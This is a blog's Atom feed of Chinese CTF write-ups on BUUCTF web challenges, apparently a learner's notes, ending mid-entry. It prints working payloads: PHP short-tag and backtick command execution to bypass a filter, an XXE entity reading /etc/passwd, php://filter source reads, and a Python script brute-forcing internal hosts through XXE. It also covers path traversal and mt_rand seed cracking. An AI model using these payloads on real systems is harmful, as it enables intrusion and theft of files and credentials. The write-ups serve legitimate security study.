<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Van</title>
  
  
  <link href="http://van0308.github.io/atom.xml" rel="self"/>
  
  <link href="http://van0308.github.io/"/>
  <updated>2023-02-10T14:38:29.723Z</updated>
  <id>http://van0308.github.io/</id>
  
  <author>
    <name>Van</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>[红明谷CTF 2021]write_shell</title>
    <link href="http://van0308.github.io/2023/02/10/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-write-shell/"/>
    <id>http://van0308.github.io/2023/02/10/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-write-shell/</id>
    <published>2023-02-10T13:20:20.000Z</published>
    <updated>2023-02-10T14:38:29.723Z</updated>
    
    <content type="html"><![CDATA[<h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><h4 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$input</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/&#x27;| |_|php|;|~|\\^|\\+|eval|&#123;|&#125;/i&quot;</span>,<span class="variable">$input</span>))&#123;</span><br><span class="line">        <span class="comment">// if(preg_match(&quot;/&#x27;| |_|=|php/&quot;,$input))&#123;</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker!!!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$input</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$input</span></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$input</span>))&#123;</span><br><span class="line">      <span class="keyword">foreach</span>(<span class="variable">$input</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$output</span>)&#123;</span><br><span class="line">          <span class="variable">$input</span>[<span class="variable">$key</span>] = <span class="title function_ invoke__">waf</span>(<span class="variable">$output</span>);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="variable">$input</span> = <span class="title function_ invoke__">check</span>(<span class="variable">$input</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$dir</span> = <span class="string">&#x27;sandbox/&#x27;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$dir</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">mkdir</span>(<span class="variable">$dir</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">switch</span>(<span class="variable">$_GET</span>[<span class="string">&quot;action&quot;</span>] ?? <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;pwd&#x27;</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$dir</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;upload&#x27;</span>:</span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$_GET</span>[<span class="string">&quot;data&quot;</span>] ?? <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">waf</span>(<span class="variable">$data</span>);</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;<span class="subst">$dir</span>&quot;</span> . <span class="string">&quot;index.php&quot;</span>, <span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h4><p>关键是利用file_put_contents查看输出结果，通过$dir得出路径</p><p>?action&#x3D;pwd  –&gt;  sandbox&#x2F;c47b21fcf8f0bc8b3920541abd8024fd&#x2F;</p><p>接下来写命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">?action=upload&amp;data=&lt;script&gt;alert(&quot;whoami&quot;)&lt;/script&gt;</span><br><span class="line">访问http://0bdbbb92-4d08-46b8-a2ff-c089a0bc56ff.node4.buuoj.cn:81/sandbox/c47b21fcf8f0bc8b3920541abd8024fd/ 成功弹窗</span><br><span class="line"></span><br><span class="line">由于写入的文件是后缀名为php的，所以要能够执行语句，语法就得满足php。过滤了PHP，可以使用php的短标签。</span><br><span class="line"></span><br><span class="line">尝试了一下&lt;?= ?&gt;可以成功写入，这个&lt;?= ?&gt;相当于&lt;?echo ?&gt;,空格杯过滤了用%09代替,或者\t</span><br><span class="line"></span><br><span class="line">执行命令：PHP执行运算符：反引号（``）。PHP 将尝试将反引号中的内容作为 shell 命令来执行，并将其输出信息返回（即，可以赋给一个变量而不是简单地丢弃到标准输出）。使用反引号运算符&quot;`&quot;的效果与函数shell_exec() 相同。</span><br><span class="line"></span><br><span class="line">注意:</span><br><span class="line">关闭了 shell_exec() 时反引号运算符是无效的。</span><br><span class="line">与其它某些语言不同，反引号不能在双引号字符串中使用。</span><br><span class="line"></span><br><span class="line">payload：</span><br><span class="line">?action=upload&amp;data=&lt;?=`ls%09/`?&gt;</span><br><span class="line">?action=upload&amp;data=&lt;?=`cat%09/f*`?&gt;</span><br><span class="line"></span><br><span class="line">a?b:c 三目运算符</span><br><span class="line">a?:b a为真返回 否则返回b</span><br><span class="line">a??b a存在(不为null)返回a，否则返回b</span><br></pre></td></tr></table></figure><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a href="https://blog.csdn.net/cjdgg/article/details/118216890">https://blog.csdn.net/cjdgg/article/details/118216890</a></p><p><a href="https://www.cnblogs.com/aninock/p/15221334.html">https://www.cnblogs.com/aninock/p/15221334.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;代码审计&quot;&gt;&lt;a href=&quot;#代码审计&quot; class=&quot;headerlink&quot; title=&quot;代码审计&quot;&gt;&lt;/a&gt;代码审计&lt;/h3&gt;&lt;h4 id=&quot;源码&quot;&gt;&lt;a href=&quot;#源码&quot; class=&quot;headerlink&quot; title=&quot;源码&quot;&gt;&lt;/a&gt;源码&lt;/h</summary>
      
    
    
    
    
    <category term="buu" scheme="http://van0308.github.io/tags/buu/"/>
    
  </entry>
  
  <entry>
    <title>[网鼎杯 2020 白虎组]PicDown</title>
    <link href="http://van0308.github.io/2023/02/10/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E7%99%BD%E8%99%8E%E7%BB%84-PicDown/"/>
    <id>http://van0308.github.io/2023/02/10/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E7%99%BD%E8%99%8E%E7%BB%84-PicDown/</id>
    <published>2023-02-10T12:57:59.000Z</published>
    <updated>2023-02-10T15:14:24.107Z</updated>
    
    <content type="html"><![CDATA[<h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>进入就是一个输入框，搜集信息啥也没有。输入之后url会有 ?url&#x3D;</p><p>一般这种就是路径遍历，ssrf，或者文件包含，PHP伪协议php:&#x2F;&#x2F;filter,file:&#x2F;&#x2F;,或者?file&#x3D;<a href="http://127.0.0.1/admin.php%E7%AD%89%E7%AD%89">http://127.0.0.1/admin.php等等</a></p><p>试一下路径遍历，发现下载了几个文件，不过仔细看大小不同。用记事本打开，知道与自己的遍历的内容有关。题目可以直接..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag找到 据说是平台环境问题，正式比赛flag不在这里。</p><p><img src="C:\Users\wen\AppData\Roaming\Typora\typora-user-images\image-20230210210219477.png" alt="image-20230210210219477"></p><p>用抓包的话，不会下载文件，而是直接可以看出内容</p><h4 id="正规解法"><a href="#正规解法" class="headerlink" title="正规解法"></a>正规解法</h4><blockquote><p>我们都知道可以通过&#x2F;proc&#x2F;$pid&#x2F;来获取指定进程的信息，例如内存映射、CPU绑定信息等等。如果某个进程想要获取本进程的系统信息，就可以通过进程的pid来访问&#x2F;proc&#x2F;$pid&#x2F;目录。但是这个方法还需要获取进程pid，在fork、daemon等情况下pid还可能发生变化。为了更方便的获取本进程的信息，linux提供了&#x2F;proc&#x2F;self&#x2F;目录，这个目录比较独特，不同的进程访问该目录时获得的信息是不同的，内容等价于&#x2F;proc&#x2F;本进程pid&#x2F;。进程可以通过访问&#x2F;proc&#x2F;self&#x2F;目录来获取自己的系统信息，而不用每次都获取pid</p></blockquote><p>即proc&#x2F;具体pid&#x2F;目录和proc&#x2F;self&#x2F;目录 基本等价</p><p>反弹shell</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://blog.csdn.net/Zero_Adam/article/details/114890384">https://blog.csdn.net/Zero_Adam/article/details/114890384</a></p><p><a href="https://blog.csdn.net/Zero_Adam/article/details/114853022">https://blog.csdn.net/Zero_Adam/article/details/114853022</a>  （坑）</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h3&gt;&lt;p&gt;进入就是一个输入框，搜集信息啥也没有。输入之后url会有 ?url&amp;#x3D;&lt;/p&gt;
&lt;p&gt;一般这种就是路径遍历，ssrf，或者文件包含，</summary>
      
    
    
    
    
    <category term="buu" scheme="http://van0308.github.io/tags/buu/"/>
    
    <category term="坑" scheme="http://van0308.github.io/tags/%E5%9D%91/"/>
    
  </entry>
  
  <entry>
    <title>CISCN2019 华北赛区 Day1 Web5]CyberPunk</title>
    <link href="http://van0308.github.io/2023/02/10/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web5-CyberPunk/"/>
    <id>http://van0308.github.io/2023/02/10/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web5-CyberPunk/</id>
    <published>2023-02-10T12:22:47.000Z</published>
    <updated>2023-02-10T12:57:07.928Z</updated>
    
    <content type="html"><![CDATA[<h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h3&gt;</summary>
      
    
    
    
    
    <category term="buu" scheme="http://van0308.github.io/tags/buu/"/>
    
  </entry>
  
  <entry>
    <title>[NCTF2019]True XML cookbook</title>
    <link href="http://van0308.github.io/2023/02/10/NCTF2019-True-XML-cookbook/"/>
    <id>http://van0308.github.io/2023/02/10/NCTF2019-True-XML-cookbook/</id>
    <published>2023-02-10T07:47:30.000Z</published>
    <updated>2023-02-10T11:38:26.077Z</updated>
    
    <content type="html"><![CDATA[<h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h3><p>进入是登录框，查看源代码发现是传输xml信息，随便填信息然后抓包也发现了xml信息 <user><username>admin</username><password>1</password></user></p><h4 id="尝试进行xxe注入"><a href="#尝试进行xxe注入" class="headerlink" title="尝试进行xxe注入"></a>尝试进行xxe注入</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">name</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span>]</span></span><br><span class="line"><span class="meta">&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;name;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>1<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line">分别读取/etc/hosts /flag 等常见的</span><br><span class="line">读不到，那么尝试读一下源码：（在做的过程中发现报错，可知路径）</span><br><span class="line">file:///var/www/html/doLogin.php  读不到</span><br><span class="line">php://filter/read=convert.base64-encode/resource=/var/www/html/doLogin.php 读到了，但是没什么信息，利用源码的账号密码登录也没用。</span><br><span class="line"></span><br><span class="line">探测内网主机 /proc/net/arp /etc/hosts</span><br><span class="line">发现有另外一个ip</span><br><span class="line">用http协议访问</span><br><span class="line">http://10.128.253.1 发现报错，尝试进行最后一位c段爆破</span><br><span class="line">最后访问成功得到flag（没做出来，怀疑是buu问题）</span><br></pre></td></tr></table></figure><h4 id="记录"><a href="#记录" class="headerlink" title="记录"></a>记录</h4><p>题目没做出来，利用http访问会很久，然后显示超时链接。</p><p>&#x2F;etc&#x2F;hosts下开两个环境，一个有ip一个没有ip，&#x2F;proc&#x2F;net&#x2F;arp里一个有一个ip，一个两个ip。</p><p>都访问不了。</p><p>贴个网上的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> res</span><br><span class="line"><span class="comment"># url=&quot;http://0c8016ed-ef08-4127-ad08-37c2bcce842e.node4.buuoj.cn:81/doLogin.php&quot;</span></span><br><span class="line">rawPayload=<span class="string">&#x27;&lt;?xml version=&quot;1.0&quot;?&gt;&#x27;</span>\</span><br><span class="line">         <span class="string">&#x27;&lt;!DOCTYPE user [&#x27;</span>\</span><br><span class="line">         <span class="string">&#x27;&lt;!ENTITY payload1 SYSTEM &quot;http://169.254.1.&#123;&#125;&quot;&gt;&#x27;</span>\</span><br><span class="line">         <span class="string">&#x27;]&gt;&#x27;</span>\</span><br><span class="line">         <span class="string">&#x27;&lt;user&gt;&#x27;</span>\</span><br><span class="line">         <span class="string">&#x27;&lt;username&gt;&#x27;</span>\</span><br><span class="line">         <span class="string">&#x27;&amp;payload1;&#x27;</span>\</span><br><span class="line">         <span class="string">&#x27;&lt;/username&gt;&#x27;</span>\</span><br><span class="line">         <span class="string">&#x27;&lt;password&gt;&#x27;</span>\</span><br><span class="line">         <span class="string">&#x27;23&#x27;</span>\</span><br><span class="line">         <span class="string">&#x27;&lt;/password&gt;&#x27;</span>\</span><br><span class="line">         <span class="string">&#x27;&lt;/user&gt;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">255</span>,<span class="number">500</span>):</span><br><span class="line">    payload=rawPayload.<span class="built_in">format</span>(i)</span><br><span class="line">    <span class="comment">#payload=rawPayload</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">str</span>(<span class="string">&quot;#&#123;&#125; =&gt;&quot;</span>).<span class="built_in">format</span>(i),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        resp=res.post(url,data=payload,timeout=<span class="number">0.3</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(resp.text,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.cnblogs.com/Article-kelp/p/16026652.html">https://www.cnblogs.com/Article-kelp/p/16026652.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;解题&quot;&gt;&lt;a href=&quot;#解题&quot; class=&quot;headerlink&quot; title=&quot;解题&quot;&gt;&lt;/a&gt;解题&lt;/h3&gt;&lt;p&gt;进入是登录框，查看源代码发现是传输xml信息，随便填信息然后抓包也发现了xml信息 &lt;user&gt;&lt;username&gt;admin&lt;/usern</summary>
      
    
    
    
    
    <category term="buu" scheme="http://van0308.github.io/tags/buu/"/>
    
  </entry>
  
  <entry>
    <title>[GWCTF 2019]枯燥的抽奖</title>
    <link href="http://van0308.github.io/2023/02/09/GWCTF-2019-%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96/"/>
    <id>http://van0308.github.io/2023/02/09/GWCTF-2019-%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96/</id>
    <published>2023-02-09T14:31:36.000Z</published>
    <updated>2023-02-10T07:10:57.470Z</updated>
    
    <content type="html"><![CDATA[<h3 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h3><h4 id="一些函数"><a href="#一些函数" class="headerlink" title="一些函数"></a>一些函数</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">session_start() 会创建新会话或者重用现有会话。</span><br><span class="line">$_SESSION — Session 变量，当前脚本可用 SESSION 变量的数组。</span><br><span class="line">rand() 函数返回随机整数。</span><br><span class="line">mt_srand(seed)函数通过分发seed种子，然后种子有了后，靠mt_rand()生成随机数。</span><br></pre></td></tr></table></figure><h4 id="PHP-mt-rand函数"><a href="#PHP-mt-rand函数" class="headerlink" title="PHP mt_rand函数"></a>PHP mt_rand函数</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">产生伪随机数。它产生随机数值的平均速度比 libc 提供的 rand() 快四倍。由可确定的函数，通过一个种子产生的伪随机数。可以通过种子/已产生的随机数来获得接下来的序列信息。有两个可选参数 min 和 max，如果没有提供可选参数，mt_rand函数将返回返回 0 到 mt_getrandmax() 之间的伪随机数。</span><br><span class="line"></span><br><span class="line">破解工具：php_mt_seed是一个破解mt_rand函数seed的工具。参数说明：四个参数（高级模式）下，前两个参数表示mt_rand第一次输出的区间，后两个参数表示mt_rand输出的区间。</span><br><span class="line"></span><br><span class="line">link：https://www.freebuf.com/vuls/192012.html</span><br></pre></td></tr></table></figure><h3 id="解题："><a href="#解题：" class="headerlink" title="解题："></a>解题：</h3><h4 id="Ctrl-U查看源代码（坑）"><a href="#Ctrl-U查看源代码（坑）" class="headerlink" title="Ctrl+U查看源代码（坑）"></a>Ctrl+U查看源代码（坑）</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">$(<span class="variable language_">document</span>).<span class="title function_">ready</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    $(<span class="string">&quot;#div1&quot;</span>).<span class="title function_">load</span>(<span class="string">&quot;check.php #p1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        $(<span class="string">&quot;.close&quot;</span>).<span class="title function_">click</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        $(<span class="string">&quot;#myAlert&quot;</span>).<span class="title function_">hide</span>();</span><br><span class="line">    &#125;);     </span><br><span class="line"></span><br><span class="line">    $(<span class="string">&quot;#button1&quot;</span>).<span class="title function_">click</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    $(<span class="string">&quot;#myAlert&quot;</span>).<span class="title function_">hide</span>();</span><br><span class="line">    guess=$(<span class="string">&quot;input&quot;</span>).<span class="title function_">val</span>();</span><br><span class="line">$.<span class="title function_">ajax</span>(&#123;</span><br><span class="line">   <span class="attr">type</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">   <span class="attr">url</span>: <span class="string">&quot;check.php&quot;</span>,</span><br><span class="line">   <span class="attr">data</span>: <span class="string">&quot;num=&quot;</span>+guess,</span><br><span class="line">   <span class="attr">success</span>: <span class="keyword">function</span>(<span class="params">msg</span>)&#123;</span><br><span class="line">     $(<span class="string">&quot;#div2&quot;</span>).<span class="title function_">append</span>(msg);</span><br><span class="line">     alertmsg = $(<span class="string">&quot;#flag&quot;</span>).<span class="title function_">text</span>(); </span><br><span class="line">     <span class="keyword">if</span>(alertmsg==<span class="string">&quot;没抽中哦，再试试吧&quot;</span>)&#123;</span><br><span class="line">      $(<span class="string">&quot;#myAlert&quot;</span>).<span class="title function_">attr</span>(<span class="string">&quot;class&quot;</span>,<span class="string">&quot;alert alert-warning&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span>($(<span class="string">&quot;#new&quot;</span>).<span class="title function_">text</span>()==<span class="string">&quot;&quot;</span>)</span><br><span class="line">     $(<span class="string">&quot;#new&quot;</span>).<span class="title function_">append</span>(alertmsg);</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">else</span>&#123;     </span><br><span class="line">     $(<span class="string">&quot;#myAlert&quot;</span>).<span class="title function_">attr</span>(<span class="string">&quot;class&quot;</span>,<span class="string">&quot;alert alert-success&quot;</span>);</span><br><span class="line">     <span class="keyword">if</span>($(<span class="string">&quot;#new&quot;</span>).<span class="title function_">text</span>()==<span class="string">&quot;&quot;</span>)</span><br><span class="line">     $(<span class="string">&quot;#new&quot;</span>).<span class="title function_">append</span>(alertmsg);</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">   &#125;</span><br><span class="line">&#125;); </span><br><span class="line">$(<span class="string">&quot;#myAlert&quot;</span>).<span class="title function_">show</span>();</span><br><span class="line">$(<span class="string">&quot;#new&quot;</span>).<span class="title function_">empty</span>();</span><br><span class="line"> $(<span class="string">&quot;#div2&quot;</span>).<span class="title function_">empty</span>();</span><br><span class="line">&#125;);</span><br><span class="line">&#125;);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>发现包含了check.php,直接访问得</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">C0WhH1dqUB</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#这不是抽奖程序的源代码！不许看！</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;seed&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;seed&#x27;</span>]=<span class="title function_ invoke__">rand</span>(<span class="number">0</span>,<span class="number">999999999</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;seed&#x27;</span>]);</span><br><span class="line"><span class="variable">$str_long1</span> = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;</span><br><span class="line"><span class="variable">$str</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$len1</span>=<span class="number">20</span>;</span><br><span class="line"><span class="keyword">for</span> ( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len1</span>; <span class="variable">$i</span>++ )&#123;</span><br><span class="line">    <span class="variable">$str</span>.=<span class="title function_ invoke__">substr</span>(<span class="variable">$str_long1</span>, <span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$str_long1</span>) - <span class="number">1</span>), <span class="number">1</span>);       </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$str_show</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$str</span>, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p id=&#x27;p1&#x27;&gt;&quot;</span>.<span class="variable">$str_show</span>.<span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;num&#x27;</span>]===<span class="variable">$str</span>)&#123;x</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p id=flag&gt;抽奖，就是那么枯燥且无味，给你flag&#123;xxxxxxxxx&#125;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p id=flag&gt;没抽中哦，再试试吧&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="string">&quot;check.php&quot;</span>);</span><br></pre></td></tr></table></figure><h4 id="审计源码"><a href="#审计源码" class="headerlink" 